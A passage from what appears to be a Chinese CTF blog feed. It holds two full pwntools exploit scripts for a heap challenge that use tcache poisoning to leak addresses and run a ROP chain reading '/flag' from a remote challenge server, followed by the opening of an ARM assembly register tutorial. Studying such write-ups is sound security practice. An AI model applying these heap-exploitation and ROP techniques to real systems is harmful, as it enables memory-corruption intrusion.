class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(leak_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line">add(<span class="number">900</span>,<span class="string">b&quot;j&quot;</span>*<span class="number">8</span>) <span class="comment">#24</span></span><br><span class="line">show(<span class="number">24</span>)</span><br><span class="line">ru(<span class="string">b&#x27;j&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">pie=uu64(r(<span class="number">6</span>))-<span class="number">0x1950</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=pie+<span class="number">0x00000000000019b3</span></span><br><span class="line">pop_rsi_r15=pie+<span class="number">0x00000000000019b1</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line">edit(<span class="number">18</span>,payload)</span><br><span class="line">leave_ret=<span class="number">0x01840</span>+pie</span><br><span class="line">p(<span class="string">&#x27;leaveret&#x27;</span>,leave_ret)</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#25</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#26</span></span><br><span class="line">dele(<span class="number">25</span>)</span><br><span class="line">dele(<span class="number">26</span>)</span><br><span class="line">edit(<span class="number">26</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#27</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#28</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#29</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#30</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#31</span></span><br><span class="line">ret=pie+<span class="number">0x1841</span></span><br><span class="line"><span class="comment"># edit(31,p64(__libc_start_main_243_stack)+p64(leave_ret))</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">31</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+p64(leave_ret))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp"><a href="#赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp" class="headerlink" title="赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp"></a>赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc_elf=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;123.60.179.52&quot;</span>,<span class="string">&quot;30304&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sa(<span class="string">b&#x27; Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sa(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">  sa(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0016B9)&#x27;) #free</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rl()</span><br><span class="line">base=uu64(r(<span class="number">6</span>))&amp;<span class="number">0xfffff000000</span></span><br><span class="line"><span class="comment"># 0x3755c020461</span></span><br><span class="line"><span class="comment"># 0x3755c 000000</span></span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#2</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak1=base+<span class="number">0x160</span></span><br><span class="line">p(<span class="string">&quot;leak1&quot;</span>,leak1)</span><br><span class="line">edit(<span class="number">2</span>,p64(leak1-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">1</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">1</span>) <span class="comment">#5 </span></span><br><span class="line">add(<span class="number">800</span>,<span class="string">b&quot;d&quot;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak2=uu64(r(<span class="number">6</span>))</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">leak3=<span class="number">0x7fd5a7093a40</span>-<span class="number">0x7fd5a7093740</span>+leak2</span><br><span class="line">p(<span class="string">&#x27;leak2&#x27;</span>,leak2)</span><br><span class="line">p(<span class="string">&#x27;leak3&#x27;</span>,leak3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(leak3-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#11</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;h&quot;</span>*<span class="number">8</span>) <span class="comment">#12</span></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">ru(<span class="string">b&#x27;h&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_stack=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;leak_stack&#x27;</span>,leak_stack)</span><br><span class="line">__libc_start_main_243_stack=leak_stack-(<span class="number">0x7ffc8d14f0d0</span>-<span class="number">0x7ffc8d14f0a8</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main_243_stack&#x27;</span>,__libc_start_main_243_stack)</span><br><span class="line"><span class="comment"># 0x1950</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#15</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#17</span></span><br><span class="line">add(<span class="number">1000</span>,<span class="string">b&quot;i&quot;</span>*<span class="number">8</span>) <span class="comment">#18</span></span><br><span class="line">show(<span class="number">18</span>)</span><br><span class="line">ru(<span class="string">b&#x27;i&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">__libc_start_main=uu64(r(<span class="number">6</span>))-<span class="number">243</span></span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">systemcall=base+libc_elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;systemcall&#x27;</span>,systemcall)</span><br><span class="line">write=base+libc_elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=base+libc_elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi=base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_r15=base+<span class="number">0x0000000000023b68</span></span><br><span class="line">pop_rdx=base+<span class="number">0x0000000000142c92</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line">edit_ret=__libc_start_main_243_stack-<span class="number">0x20</span></span><br><span class="line">p(<span class="string">&#x27;edit_ret&#x27;</span>,edit_ret)</span><br><span class="line">bss=__libc_start_main_243_stack+<span class="number">0x100</span></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi_r15)+p64(leak1)+p64(<span class="number">0xdeadbeef</span>)+p64(systemcall)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)</span><br><span class="line">payload+=p64(bss)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdx)+p64(<span class="number">60</span>)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdx)+p64(<span class="number">60</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;z&quot;</span>*<span class="number">1</span>) <span class="comment">#19</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#24</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#25</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">25</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM ASM</title>
      <link href="/2023/07/14/arm-asm/"/>
      <url>/2023/07/14/arm-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM ASM"></a>ARM ASM</h1><p>手册  <a href="https://developer.arm.com/documentation/ddi0487/fc/">https://developer.arm.com/documentation/ddi0487/fc/</a></p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><table><thead><tr><th>Reg</th><th>APCS</th><th>mean</th></tr></thead><tbody><tr><td>R0</td><td>A1</td><td>工作寄存器</td></tr><tr><td>R1</td><td>A2</td><td></td></tr><tr><td>R2</td><td>A3</td><td></td></tr><tr><td>R3</td><td>A4</td><td></td></tr><tr><td>R4</td><td>V1</td><td>变量寄存器(易变寄存器)</td></tr><tr><td>R5</td><td>V2</td><td></td></tr><tr><td>R6</td><td>V3</td><td></td></tr><tr><td>R7</td><td>V4</td><td>常用来存放系统调用号</td></tr><tr><td>R8</td><td>V5</td><td></td></tr><tr><td>R9</td><td>V6&#x2F;SB</td><td>静态基址寄存器</td></tr><tr><td>R10</td><td>V7&#x2F;SL</td><td>堆栈限制寄存器</td></tr><tr><td><strong>R11</strong></td><td>V8&#x2F;<strong>FP</strong></td><td>帧指针，保存栈帧，相当于x86 ebp</td></tr><tr><td>R12</td><td>IP</td><td>指令指针(临时存放sp)</td></tr><tr><td><strong>R13</strong></td><td><strong>SP</strong></td><td>栈顶指针，相当于x86 esp</td></tr><tr><td><strong>R14</strong></td><td><strong>LR</strong></td><td>Link Register链接寄存器，保存函数返回地址</td></tr><tr><td><strong>R15</strong></td><td><strong>PC</strong></td><td>程序计数器</td></tr><tr><td>CPSR</td><td></td><td>Current Program Status Register 程序状态寄存器</td></tr><tr><td>SPSR</td><td></td><td>Saved Program Status Register 中断或异常时保存CPSR</td></tr></tbody></table><blockquote><p>APCS ：ARM Procedure Call Standard</p></blockquote><ul><li><code>R0 ~ R3</code>是用来依次传递参数的</li><li><code>R0</code>还被用于存储函数的返回值</li><li><code>R7</code>常用来存放系统调用号</li><li><code>R11</code>是栈帧，相当于x86的<code>ebp</code>，<code>arm</code>中叫作<code>FP</code></li><li><code>R13</code>是栈顶，相当于x86的<code>esp</code>，<code>arm</code>中叫作<code>SP</code></li><li><code>R14(LP)</code>用来存放函数的返回地址的</li></ul><p>关于pc寄存器是可以直接赋值的如mov pc，r0</p><p>如果是arm状态，读pc是会读取到当前指令往后两条指令的位置，如ldr r0,[pc],以mov r0,pc为例，一条指令四个字节的话 r0&#x3D;pc+8</p><p>thumb状态下就是+4，thumb状态下，指令是变长的，即使当前指令下面两条指令是一个四字节一个二字节，<strong>依旧是读出来依旧是+4</strong></p><p>ldr r0,[pc] 如果pc+4不为四字节对齐的话，会向下取整到四字节对齐后再读取</p><p><img 